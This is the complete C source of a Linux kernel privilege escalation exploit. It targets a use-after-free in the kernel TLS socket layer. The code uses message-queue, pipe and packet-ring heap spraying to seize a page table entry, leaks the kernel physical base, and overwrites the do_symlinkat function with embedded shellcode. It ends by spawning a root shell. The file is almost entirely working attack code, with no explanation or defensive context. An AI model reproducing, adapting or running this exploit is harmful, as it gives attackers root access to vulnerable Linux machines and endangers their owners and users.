#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/if_packet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>

#define UID_MAP   "/proc/self/uid_map"
#define GID_MAP   "/proc/self/gid_map"
#define SETGROUPS "/proc/self/setgroups"

#define PAGE_SIZE       4096
#define PTE_SPRAY       1000
#define PBUF_SPRAY      500
#define NUM_PIPES       220
#define PAGES_PER_PIPE  2

#define OBJS_PER_SLAB_512   16
#define CPU_PARTIAL_512     52
#define K512_VICTIM_CHUNKS  (OBJS_PER_SLAB_512 * (CPU_PARTIAL_512 + 1) * 4)

#define HEADER_SIZE     48
#define MSG_DATA_SIZE   (512 - HEADER_SIZE)
#define MSG_SPRAY       (K512_VICTIM_CHUNKS / 2)

#define KERNEL_PHYSICAL_BASE_ADDR   0x1000000

struct spray_msg 
{
    long mtype;
    char mtext[MSG_DATA_SIZE];
};

struct pipe_pair 
{
    int fd[2];
};

cpu_set_t t1_cpu, t2_cpu;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

char spray_buf[PAGE_SIZE];
int qids[K512_VICTIM_CHUNKS];
int socketfds[PBUF_SPRAY];
void *pbuf_pages[PBUF_SPRAY];
void *page_spray[PTE_SPRAY];

struct spray_msg msg_buf;
struct pipe_pair pipes[NUM_PIPES];

/*
 * Setup
 */
static void save_state(void) 
{
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory"
    );
}

void init_cpu(void)
{
	CPU_ZERO(&t1_cpu);
    CPU_ZERO(&t2_cpu);
	CPU_SET(0, &t1_cpu);
    CPU_SET(1, &t2_cpu);
}

void setup_cpu(uint8_t cpu_num)
{
    cpu_set_t *cpu_set = cpu_num == 0 ? &t1_cpu : &t2_cpu;

    if (sched_setaffinity(getpid(), sizeof(cpu_set_t), cpu_set)) 
    {
        perror("[x] sched_setaffinity");
        exit(1);
    }
}

void setup_vma_pages(int i)
{
    page_spray[i] = mmap((void *)(0x200000 + i * 0x10000UL),
                        0x8000, PROT_READ | PROT_WRITE,
                        MAP_ANONYMOUS | MAP_SHARED, -1, 0);

    if (page_spray[i] == MAP_FAILED) 
    {
        perror("[x] mmap");
        exit(1);
    }
}

void setup_pipes(int i)
{
    if (pipe(pipes[i].fd) < 0) 
    {
        perror("[x] pipe");
        exit(1);
    }
}

void setup_lo(char *type, int opt)
{
    struct ifreq ifr;
    int lo = socket(AF_INET, SOCK_DGRAM, 0);

    memset(&ifr, 0, sizeof(ifr));
    strcpy(ifr.ifr_name, type);
    ifr.ifr_flags = opt;

    ioctl(lo, SIOCSIFFLAGS, &ifr);
    close(lo);
}

void setup_packet_socket(int i)
{
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) 
    {
		perror("[x] socket(AF_PACKET)");
		exit(1);
	}

    socketfds[i] = s;
}

/* noise: connect() -> kmalloc-512(neighbour) */
int setup_socket(int port) 
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    int server, client;

    setup_cpu(1);

    client = socket(AF_INET, SOCK_STREAM, 0); 
    server = socket(AF_INET, SOCK_STREAM, 0); 

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    bind(server, &addr, sizeof(addr));
    listen(server, 0);
    connect(client, &addr, sizeof(addr));
    accept(server, &addr, &len);

    setup_cpu(0);

    return client;
}

void setup_msg(char chr)
{
    int msg_set = chr;
    msg_buf.mtype = 1;
    memset(msg_buf.mtext, msg_set, MSG_DATA_SIZE);
}

/*
 * Utilities
 */
void msg_alloc(int i)
{
    qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (qids[i] < 0) 
    {
        perror("[x] msgget");
        exit(1);
    }

    if (msgsnd(qids[i], &msg_buf, MSG_DATA_SIZE, IPC_NOWAIT) < 0) 
    {
        perror("[x] msgsnd");
        exit(1);
    }
}

void msg_free(int i)
{
    if (msgrcv(qids[i], &msg_buf, MSG_DATA_SIZE, 1, IPC_NOWAIT) < 0) 
    {
        perror("[x] msgrcv");
        exit(1);
    }

    if (msgctl(qids[i], IPC_RMID, NULL) < 0) 
    {
        perror("[x] msgctl");
        exit(1);
    }
}

int alloc_packet_ring_buffer(int i, int block_size, int frame_size, int blocknum)
{
    struct tpacket_req3 req;
    int v = TPACKET_V3;

    int rv = setsockopt(socketfds[i], SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) 
    {
		perror("[x] setsockopt(PACKET_VERSION)");
        printf("    socketfds[%d]: %d\n", i, socketfds[i]);
		exit(1);
	}

    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = blocknum;
    req.tp_frame_nr = (block_size * blocknum) / frame_size;
    req.tp_retire_blk_tov = 60;

    rv = setsockopt(socketfds[i], SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) 
    {
		perror("[x] setsockopt(PACKET_RX_RING)");
		exit(1);
	}
}

void mmap_packet_ring_buffer(int i, int size, char chr)
{
    void *vma = mmap(NULL, size, PROT_READ|PROT_WRITE, 
                    MAP_SHARED|MAP_LOCKED, socketfds[i], 0);
                    
    if (vma == MAP_FAILED)
    {
        perror("[x] mmap(socketfd)");
        printf("    socketfd[%d]: %d\n", i, socketfds[i]);
        exit(1);
    }

    memset(vma, chr, size);
    pbuf_pages[i] = vma;
}

void spray_pages(int i)
{
    ssize_t retval = write(pipes[i].fd[1], spray_buf, PAGE_SIZE);
    if (retval != PAGE_SIZE)
    {
        perror("[x] spray_pages() - write()");
        exit(1);
    }
}

void release_pipes(int i)
{
    if (pipes[i].fd[0] > 0) close(pipes[i].fd[0]);
    if (pipes[i].fd[1] > 0) close(pipes[i].fd[1]);
}

int scan_page(int i)
{
    uint64_t pbuf_sign = 0x3000000002;
    uint64_t value = *((uint64_t *)pbuf_pages[i]);

    if (value != pbuf_sign) return 1;
    return 0;
}

int write_file(char *path, char *data, size_t size)
{
	int fd;

	fd = open(path, O_WRONLY | O_CREAT, 0777);

	if (fd < 0) 
    {
		perror("[x] write_file()");
		return -1;
	}

	if (write(fd, data, size) < 0) 
    {
		perror("[x] write_file()");
		close(fd);
		return -1;
	}

	close(fd);
	return 0;
}

void new_map(char *path, int in, int out)
{
	char buff[0x40] = { 0 };

	snprintf(buff, sizeof(buff), "%d %d 1", in, out);

	if (write_file(path, buff, strlen(buff)) < 0) 
    {
		perror("[x] new_map() - write()");
		exit(1);
	}
}

void tls_alloc(int sock_fd)
{
    if (setsockopt(sock_fd, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0)
    {
        perror("[x] tls_alloc");
        exit(1);
    }
}

/* noise: connect() -> kmalloc-512(neighbour) */
int tls_copy(int sk, int port) 
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    int client, server;

    setup_cpu(1);

    client = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family = AF_UNSPEC;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    connect(sk, &addr, sizeof(addr));
    addr.sin_family = AF_INET;
    bind(sk, &addr, sizeof(addr));
    listen(sk, 0);
    connect(client, &addr, sizeof(addr));
    server = accept(sk, &addr, &len);

    setup_cpu(0);

    return server;
}

static void win(void) 
{
    char *args[] = { "/bin/sh", "-i", NULL };

    puts("[+] We are Ro0ot!");
    execve(args[0], args, NULL);
}

int sandbox(void)
{
	int uid, gid;

	uid = getuid();
	gid = getgid();

	if (unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET) < 0) 
    {
		perror("[x] unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET)");
		return -1;
	}

	write_file(SETGROUPS, "deny", strlen("deny"));
	new_map(UID_MAP, 0, uid);
	new_map(GID_MAP, 0, gid);

    setup_lo("lo", IFF_UP | IFF_RUNNING);

	return 0;
}

void initialize(void)
{
    init_cpu();
    setup_cpu(0);
    save_state();
    sandbox();
    
    for (int i = 0; i < PBUF_SPRAY; i++)
    {
        setup_packet_socket(i);
    }

    for (int i = 0; i < PTE_SPRAY; i++)
    {
        setup_vma_pages(i);
    }

    for (int i = 0; i < NUM_PIPES; i++)
    {
        setup_pipes(i);
    }
}

void main(void)
{
    int tls_p, tls_c, tls_g, idx = 0;
    void *overlap_page = NULL;
    uint64_t *pte_page = NULL;

    initialize();

    tls_p = setup_socket(1234);

    puts("[*] Step 1. kmalloc-512 spray(1)");
    setup_msg('A');
    for (int i = 0; i < MSG_SPRAY; i++) 
    {
        msg_alloc(i);
    }

    tls_alloc(tls_p);
    tls_c = tls_copy(tls_p, 5678); 
    tls_g = tls_copy(tls_c, 9100);
    close(tls_p);
    
    puts("[*] Step 2. kmalloc-512 spray(2)");
    setup_msg('B');
    for (int i = MSG_SPRAY; i < K512_VICTIM_CHUNKS; i++) 
    {
        msg_alloc(i);
    }

    /* kfree_rcu_work(tls_context) */
    sleep(6);

    close(tls_c);
    close(tls_g);

    /* for order-1 page reclaim to order-0 */
    puts("[*] Step 3. flushing per-CPU page list");
    for (int i = K512_VICTIM_CHUNKS - 1; i >= 0 ; i--) 
    {
        msg_free(i);
    }

    memset(spray_buf, 'C', PAGE_SIZE);
    for (int i = 0; i < NUM_PIPES; i++)
    {
        for (int j = 0; j < PAGES_PER_PIPE; j++)
        {
            spray_pages(i);
        }
    }

    puts("[*] Step 4. page spray (1): packet_ring_buffer");
    for (int i = 0; i < PBUF_SPRAY; i += 2)
    {
        if (idx < NUM_PIPES) release_pipes(idx++);
        alloc_packet_ring_buffer(i, PAGE_SIZE, PAGE_SIZE, 1);
        alloc_packet_ring_buffer(i + 1, PAGE_SIZE, PAGE_SIZE, 1);
    }

    for (int i = 0; i < PBUF_SPRAY; i++)
    {
        mmap_packet_ring_buffer(i, PAGE_SIZE, 'D');
    }

    /* kfree_rcu_work(pbuf_page, pbuf_page): page->_refcount decreased from 2 to 0 */
    sleep(6);

    puts("[*] Step 5. page spray (2): PTE");
    for (int i = 0; i < PTE_SPRAY; i++) 
    {
        for (int j = 0; j < 8; j++) 
        {
           *((char *)page_spray[i] + j * 0x1000) = 'E';
        }
    }

    for (int i = 0; i < PBUF_SPRAY; i++)
    {
        if (scan_page(i) > 0)
        {
            printf("[+] reclaimed to PTE: pbuf_pages[%d]\n", i);
            fflush(stdout);
            pte_page = (uint64_t *)pbuf_pages[i];
            break;
        }
    }

    if (pte_page == NULL)
    {
        puts("[x] Failed exp");
        exit(1);
    }

    uint64_t *page_table_entry = (uint64_t *)((uint8_t *)pte_page + 0x38);

    for (size_t offset = 0; offset < 0x40; offset += sizeof(uint64_t))
    {
        uint64_t *ptr = (uint64_t *)((uint8_t *)pte_page + offset);
        uint64_t pte_entry = *ptr;
        uint64_t phys_addr = (pte_entry & ~0xfffULL) & ~(1ULL << 63);

        printf("[+] PTE (%p): %#lx  =>  %#lx\n", (void *)ptr, pte_entry, phys_addr);
        fflush(stdout);
    }

    *page_table_entry = 0x800000000009c067;
    printf("[+] update page table entry: %#lx\n", *page_table_entry);

    puts("[*] Step 6. searching for an overlapping page");
    for (int i = 0; i < PTE_SPRAY; i++) 
    {
        for (int j = 0; j < 8; j++) 
        {
            if (*((char *)page_spray[i] + j * 0x1000) != 'E')
            {
                overlap_page = (char *)page_spray[i] + j * 0x1000;
                printf("[+] overlapping page found: %p\n", overlap_page);
                fflush(stdout);
                break;
            }
        }
    }

    if (overlap_page == NULL) 
    {
        puts("[x] Overlapping page not found");
        exit(1);
    }

    puts("[*] Step 7. leaking kernel physical base");
    uint64_t leaked_val = *(uint64_t *)overlap_page;
    printf("[+] leaked value at phys 0x9c000: %#lx\n", leaked_val);
    
    uint64_t phys_base = (leaked_val & ~0xfffULL) - 0x2204000;
    if (phys_base < KERNEL_PHYSICAL_BASE_ADDR) 
    {
        puts("[+] KASLR is not enabled on the target system!");
        phys_base = KERNEL_PHYSICAL_BASE_ADDR;
    }
    printf("[+] kernel physical base address: %#lx\n", phys_base);

    puts("[*] Step 8. overwriting do_symlinkat");
    size_t phys_func = phys_base + 0x241380; // do_symlinkat offset
    *page_table_entry = (phys_func & ~0xfffULL) | 0x8000000000000067ULL;

    char shellcode[] = 
    { 
        0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00,
        0x00, 0x41, 0x5f, 0x49, 0x81, 0xef, 0x89, 0x13,
        0x24, 0x00, 0x49, 0x8d, 0xbf, 0x00, 0x0a, 0x85,
        0x01, 0x49, 0x8d, 0x87, 0xf0, 0x9e, 0x09, 0x00,
        0xff, 0xd0, 0x49, 0x8d, 0xbf, 0x80, 0x61, 0x96,
        0x01, 0x49, 0x8d, 0x87, 0x50, 0xc0, 0x26, 0x00,
        0xff, 0xd0, 0x48, 0x89, 0xc3, 0x48, 0xbf, 0x11,
        0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x49,
        0x8d, 0x87, 0x50, 0x29, 0x09, 0x00, 0xff, 0xd0,
        0x48, 0x89, 0x98, 0x40, 0x07, 0x00, 0x00, 0x31,
        0xc0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0x44,
        0x24, 0x08, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22,
        0x22, 0x22, 0x22, 0x22, 0x48, 0x89, 0x44, 0x24,
        0x10, 0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33,
        0x33, 0x33, 0x33, 0x48, 0x89, 0x44, 0x24, 0x18,
        0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44,
        0x44, 0x44, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48,
        0xb8, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
        0x55, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0xb8,
        0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,
        0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8d, 0x87,
        0x01, 0x0f, 0xe0, 0x00, 0xff, 0xe0, 0xcc 
    };

    void *p;
    p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
    *(size_t*)p = getpid();
    p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
    *(size_t*)p = (size_t)&win;
    p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
    *(size_t*)p = user_cs;
    p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
    *(size_t*)p = user_rflags;
    p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
    *(size_t*)p = user_rsp;
    p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
    *(size_t*)p = user_ss;

    puts("[*] Step 9. call the corrupted function");
    memcpy(overlap_page + (phys_func & 0xfffULL), shellcode, sizeof(shellcode));

    printf("%d\n", symlink("/bin/x", "/bin")); // b *do_symlinkat
    puts("[x] Failed exp");
}